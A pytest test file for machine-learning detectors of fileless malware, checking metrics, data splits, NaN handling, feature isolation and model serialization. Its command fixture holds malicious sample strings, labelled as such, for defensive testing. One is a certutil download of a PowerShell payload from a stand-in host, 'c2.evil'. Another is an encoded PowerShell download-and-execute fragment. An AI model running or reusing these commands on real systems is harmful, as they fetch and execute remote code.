"""Unit and integration tests for fileless malware binary detection models.

Covers:
- Model interface compliance (predict_proba, predict, save, load)
- Probability shape (N,) and bounds [0.0, 1.0]
- Predict threshold behavior
- Modality isolation (no model consumes other modality features)
- Artifact save/load round-trip (identical predictions after reload)
- Command transformer tokenization (empty, long, PowerShell commands)
- Metric calculation accuracy (Confusion matrix [[TN, FP], [FN, TP]], FPR, FNR, ROC-AUC edge cases)
- Train/test zero-leakage separation
- Metadata generation with small_dataset_warning
"""

from __future__ import annotations

from pathlib import Path

import numpy as np
import pandas as pd
import pytest

from models.command.model import CommandModel
from models.common import (
    compute_binary_metrics,
    stratified_split_dataset,
)
from models.memory.model import PERMITTED_MEMORY_FEATURES, MemoryModel
from models.network.model import PERMITTED_NETWORK_FEATURES, NetworkModel
from models.process.model import PERMITTED_PROCESS_FEATURES, ProcessModel

# ---------------------------------------------------------------------------
# Fixtures for synthetic modality data
# ---------------------------------------------------------------------------


@pytest.fixture
def process_data() -> tuple[pd.DataFrame, np.ndarray]:
    """Generate minimal synthetic process data for testing."""
    rng = np.random.RandomState(42)
    n = 20
    data = {col: rng.randint(0, 100, size=n) for col in PERMITTED_PROCESS_FEATURES}
    df = pd.DataFrame(data)
    y = np.array([0] * 10 + [1] * 10)
    return df, y


@pytest.fixture
def network_data() -> tuple[pd.DataFrame, np.ndarray]:
    """Generate minimal synthetic network data preserving NaNs in PCAP fields."""
    rng = np.random.RandomState(42)
    n = 20
    data = {col: rng.randint(0, 50, size=n).astype(float) for col in PERMITTED_NETWORK_FEATURES}
    # Inject NaNs for PCAP-dependent features
    for col in ["dns_query_count", "avg_interpacket_interval_ms", "total_bytes_sent"]:
        if col in data:
            data[col][:] = np.nan
    df = pd.DataFrame(data)
    y = np.array([0] * 10 + [1] * 10)
    return df, y


@pytest.fixture
def memory_data() -> tuple[pd.DataFrame, np.ndarray]:
    """Generate minimal synthetic memory data with null entropy."""
    rng = np.random.RandomState(42)
    n = 20
    data = {col: rng.randint(0, 30, size=n).astype(float) for col in PERMITTED_MEMORY_FEATURES}
    # Entropy nulls
    data["mean_memory_entropy"] = np.array([np.nan] * n)
    data["max_memory_entropy"] = np.array([np.nan] * n)
    df = pd.DataFrame(data)
    y = np.array([0] * 10 + [1] * 10)
    return df, y


@pytest.fixture
def command_data() -> tuple[list[str], np.ndarray]:
    """Generate minimal synthetic command strings."""
    texts = [
        "C:\\Windows\\system32\\cmd.exe /c dir",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Write-Host Clean",
        "powershell.exe -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp",
        "cmd.exe /c certutil.exe -urlcache -split -f http://c2.evil/payload.ps1",
    ] * 5
    y = np.array([0, 0, 1, 1] * 5)
    return texts, y


# ---------------------------------------------------------------------------
# Test Common Evaluation Metrics & Splitting
# ---------------------------------------------------------------------------


class TestCommonEvaluation:
    """Tests for metric calculations, confusion matrix, and stratified splitting."""

    def test_metric_calculation_perfect(self) -> None:
        """Test metrics on perfect predictions."""
        y_true = np.array([0, 0, 1, 1])
        y_prob = np.array([0.1, 0.2, 0.8, 0.9])
        metrics = compute_binary_metrics(y_true, y_prob, threshold=0.5)

        assert metrics["accuracy"] == 1.0
        assert metrics["precision"] == 1.0
        assert metrics["recall"] == 1.0
        assert metrics["f1"] == 1.0
        assert metrics["roc_auc"] == 1.0
        assert metrics["fpr"] == 0.0
        assert metrics["fnr"] == 0.0
        assert metrics["confusion_matrix"] == [[2, 0], [0, 2]]

    def test_metric_calculation_with_errors(self) -> None:
        """Test FPR, FNR, and confusion matrix on imperfect predictions."""
        y_true = np.array([0, 0, 1, 1])
        # Preds at 0.5: [1, 0, 0, 1] -> TN=1, FP=1, FN=1, TP=1
        y_prob = np.array([0.6, 0.1, 0.4, 0.9])
        metrics = compute_binary_metrics(y_true, y_prob, threshold=0.5)

        assert metrics["confusion_matrix"] == [[1, 1], [1, 1]]
        assert metrics["fpr"] == 0.5  # 1 / (1 + 1)
        assert metrics["fnr"] == 0.5  # 1 / (1 + 1)
        assert metrics["accuracy"] == 0.5

    def test_roc_auc_single_class_is_none(self) -> None:
        """Single-class test partition must return roc_auc=None without raising error."""
        y_true = np.array([1, 1, 1])  # Only positive class
        y_prob = np.array([0.7, 0.8, 0.9])
        metrics = compute_binary_metrics(y_true, y_prob)

        assert metrics["roc_auc"] is None, "ROC-AUC must be null when only 1 class exists in y_true"
        assert metrics["accuracy"] == 1.0

    def test_stratified_split_preserves_classes(self) -> None:
        """Stratified 70/15/15 split must preserve both classes across all partitions."""
        df = pd.DataFrame(
            {
                "feature": range(45),
                "binary_label": [0] * 13 + [1] * 32,
            }
        )
        train, val, test = stratified_split_dataset(df, target_col="binary_label", random_state=42)

        assert len(train) == 31
        assert len(val) == 7
        assert len(test) == 7
        assert len(train) + len(val) + len(test) == 45

        for partition, p_df in [("train", train), ("val", val), ("test", test)]:
            classes = set(p_df["binary_label"])
            assert 0 in classes, f"{partition} partition missing benign class (0)"
            assert 1 in classes, f"{partition} partition missing malware class (1)"


# ---------------------------------------------------------------------------
# Test Process Model (XGBoost)
# ---------------------------------------------------------------------------


class TestProcessModel:
    """Tests for ProcessModel interface, isolation, and serialization."""

    def test_process_model_interface(self, process_data: tuple[pd.DataFrame, np.ndarray]) -> None:
        """Verify predict_proba returns 1D array in [0.0, 1.0] and predict returns {0, 1}."""
        X, y = process_data
        model = ProcessModel()
        model.classifier.fit(X.values, y)

        probs = model.predict_proba(X)
        assert isinstance(probs, np.ndarray)
        assert probs.ndim == 1
        assert probs.shape == (len(X),)
        assert np.all((probs >= 0.0) & (probs <= 1.0))

        preds = model.predict(X, threshold=0.5)
        assert isinstance(preds, np.ndarray)
        assert preds.shape == (len(X),)
        assert set(np.unique(preds)).issubset({0, 1})

    def test_process_model_threshold_behavior(
        self, process_data: tuple[pd.DataFrame, np.ndarray]
    ) -> None:
        """Higher threshold must result in less or equal positive malware predictions."""
        X, y = process_data
        model = ProcessModel()
        model.classifier.fit(X.values, y)

        preds_low = model.predict(X, threshold=0.2)
        preds_high = model.predict(X, threshold=0.8)
        assert np.sum(preds_high) <= np.sum(preds_low)

    def test_process_model_modality_isolation(self) -> None:
        """ProcessModel must raise KeyError if passed non-process features."""
        model = ProcessModel()
        foreign_df = pd.DataFrame(
            {"active_connection_count": [1, 2], "raw_command_text": ["a", "b"]}
        )
        with pytest.raises(KeyError, match="missing required features"):
            model.predict_proba(foreign_df)

    def test_process_model_save_load(
        self, process_data: tuple[pd.DataFrame, np.ndarray], tmp_path: Path
    ) -> None:
        """Serialized ProcessModel must produce identical predictions after reload."""
        X, y = process_data
        model = ProcessModel()
        model.classifier.fit(X.values, y)

        orig_probs = model.predict_proba(X)
        save_dir = tmp_path / "process_artifact"
        model.save(save_dir)

        assert (save_dir / "features.json").exists()
        assert (save_dir / "model.json").exists()

        loaded_model = ProcessModel.load(save_dir)
        loaded_probs = loaded_model.predict_proba(X)

        np.testing.assert_allclose(orig_probs, loaded_probs, rtol=1e-5)


# ---------------------------------------------------------------------------
# Test Network Model (LightGBM)
# ---------------------------------------------------------------------------


class TestNetworkModel:
    """Tests for NetworkModel interface, native NaN handling, and serialization."""

    def test_network_model_interface(self, network_data: tuple[pd.DataFrame, np.ndarray]) -> None:
        """Verify predict_proba and predict interface compliance."""
        X, y = network_data
        model = NetworkModel()
        model.classifier.fit(X.values, y)

        probs = model.predict_proba(X)
        assert isinstance(probs, np.ndarray)
        assert probs.ndim == 1
        assert probs.shape == (len(X),)
        assert np.all((probs >= 0.0) & (probs <= 1.0))

    def test_network_native_nan_preservation(
        self, network_data: tuple[pd.DataFrame, np.ndarray]
    ) -> None:
        """Verify LightGBM handles genuine NaNs in PCAP fields without error."""
        X, y = network_data
        assert np.isnan(X["dns_query_count"].iloc[0])

        model = NetworkModel()
        model.classifier.fit(X.values, y)
        probs = model.predict_proba(X)

        assert len(probs) == len(X)
        assert not np.isnan(probs).any(), "Probabilities should never be NaN"

    def test_network_modality_isolation(self) -> None:
        """NetworkModel must reject DataFrames lacking network features."""
        model = NetworkModel()
        foreign_df = pd.DataFrame({"total_process_count": [5], "rwx_page_count": [2]})
        with pytest.raises(KeyError, match="missing required features"):
            model.predict_proba(foreign_df)

    def test_network_model_save_load(
        self, network_data: tuple[pd.DataFrame, np.ndarray], tmp_path: Path
    ) -> None:
        """Serialized NetworkModel must produce identical predictions after reload."""
        X, y = network_data
        model = NetworkModel()
        model.classifier.fit(X.values, y)

        orig_probs = model.predict_proba(X)
        save_dir = tmp_path / "network_artifact"
        model.save(save_dir)

        loaded_model = NetworkModel.load(save_dir)
        loaded_probs = loaded_model.predict_proba(X)

        np.testing.assert_allclose(orig_probs, loaded_probs, rtol=1e-5)


# ---------------------------------------------------------------------------
# Test Memory Model (CatBoost)
# ---------------------------------------------------------------------------


class TestMemoryModel:
    """Tests for MemoryModel interface, NaN handling, and serialization."""

    def test_memory_model_interface(self, memory_data: tuple[pd.DataFrame, np.ndarray]) -> None:
        """Verify predict_proba and predict interface compliance."""
        X, y = memory_data
        model = MemoryModel()
        model.classifier.fit(X.values, y)

        probs = model.predict_proba(X)
        assert isinstance(probs, np.ndarray)
        assert probs.ndim == 1
        assert probs.shape == (len(X),)
        assert np.all((probs >= 0.0) & (probs <= 1.0))

    def test_memory_entropy_nan_handling(
        self, memory_data: tuple[pd.DataFrame, np.ndarray]
    ) -> None:
        """Verify CatBoost natively handles null memory entropy via nan_mode='Min'."""
        X, y = memory_data
        model = MemoryModel()
        model.classifier.fit(X.values, y)
        probs = model.predict_proba(X)

        assert len(probs) == len(X)
        assert not np.isnan(probs).any()

    def test_memory_modality_isolation(self) -> None:
        """MemoryModel must reject foreign features."""
        model = MemoryModel()
        foreign_df = pd.DataFrame({"dns_query_count": [10], "command_length": [50]})
        with pytest.raises(KeyError, match="missing required features"):
            model.predict_proba(foreign_df)

    def test_memory_model_save_load(
        self, memory_data: tuple[pd.DataFrame, np.ndarray], tmp_path: Path
    ) -> None:
        """Serialized MemoryModel must produce identical predictions after reload."""
        X, y = memory_data
        model = MemoryModel()
        model.classifier.fit(X.values, y)

        orig_probs = model.predict_proba(X)
        save_dir = tmp_path / "memory_artifact"
        model.save(save_dir)

        loaded_model = MemoryModel.load(save_dir)
        loaded_probs = loaded_model.predict_proba(X)

        np.testing.assert_allclose(orig_probs, loaded_probs, rtol=1e-5)


# ---------------------------------------------------------------------------
# Test Command Model (DistilBERT)
# ---------------------------------------------------------------------------


class TestCommandModel:
    """Tests for CommandModel transformer tokenization, empty text, and isolation."""

    def test_command_tokenization_handling(self) -> None:
        """Test tokenization on empty, very long, and PowerShell command texts."""
        from transformers import (
            DistilBertConfig,
            DistilBertForSequenceClassification,
            DistilBertTokenizer,
        )

        config = DistilBertConfig(
            vocab_size=1000, n_layers=1, n_heads=1, dim=32, hidden_dim=64, num_labels=2
        )
        model = DistilBertForSequenceClassification(config)

        # Mock minimal tokenizer
        import tempfile

        with tempfile.TemporaryDirectory() as td:
            vocab_file = Path(td) / "vocab.txt"
            vocab_file.write_text(
                "[PAD]\n[UNK]\n[CLS]\n[SEP]\npowershell\nexe\nwhoami\ncmd\n", encoding="utf-8"
            )
            tokenizer = DistilBertTokenizer(str(vocab_file))

            cmd_model = CommandModel(model=model, tokenizer=tokenizer, max_length=16)

            # 1. Empty command
            p_empty = cmd_model.predict_proba([""])
            assert p_empty.shape == (1,)
            assert 0.0 <= p_empty[0] <= 1.0

            # 2. Long command (>500 chars) truncated safely
            long_cmd = "powershell.exe " + "arg " * 200
            p_long = cmd_model.predict_proba([long_cmd])
            assert p_long.shape == (1,)
            assert 0.0 <= p_long[0] <= 1.0

            # 3. PowerShell text
            p_ps = cmd_model.predict_proba(["powershell.exe whoami"])
            assert p_ps.shape == (1,)
            assert 0.0 <= p_ps[0] <= 1.0

    def test_command_modality_isolation(self) -> None:
        """CommandModel must reject DataFrames containing only tabular process/memory features."""
        from transformers import DistilBertConfig, DistilBertForSequenceClassification

        config = DistilBertConfig(
            vocab_size=100, n_layers=1, n_heads=1, dim=16, hidden_dim=32, num_labels=2
        )
        model = DistilBertForSequenceClassification(config)
        cmd_model = CommandModel(model=model, tokenizer=None)

        foreign_df = pd.DataFrame({"total_process_count": [10], "rwx_page_count": [5]})
        with pytest.raises(KeyError, match="CommandModel requires 'raw_command_text'"):
            cmd_model.predict_proba(foreign_df)
